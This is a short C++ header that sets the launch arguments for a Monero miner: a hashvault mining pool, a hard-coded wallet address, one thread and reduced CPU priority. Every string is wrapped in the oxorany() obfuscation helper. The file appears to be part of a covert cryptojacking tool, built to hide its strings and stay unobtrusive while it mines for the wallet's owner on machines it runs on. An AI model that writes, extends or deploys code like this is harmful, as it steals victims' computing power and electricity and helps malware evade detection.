#pragma once
std::vector<std::string> arrargs = {
oxorany("--url=pool.hashvault.pro:443"),
oxorany("--user=4ANZNANEzLA2U2Xs3wrsu5bUXNbqqWHoDe2YEWKe2o8L5xLn4giRBBzWeYHDCiQ49XjUPeMB4bmZaD7zyAob7AEcAzcDLCF"),
oxorany("--randomx-init=1"),
oxorany("--cpu-priority=2"),
oxorany("--threads=1"),
oxorany("--randomx-mode=light"),
};
std::string workerpath	= "WORKER";
std::string kitpath	= "WORKER";
std::string args;
void setup_args() { for (auto& it : arrargs) { args += " " + it; }  }
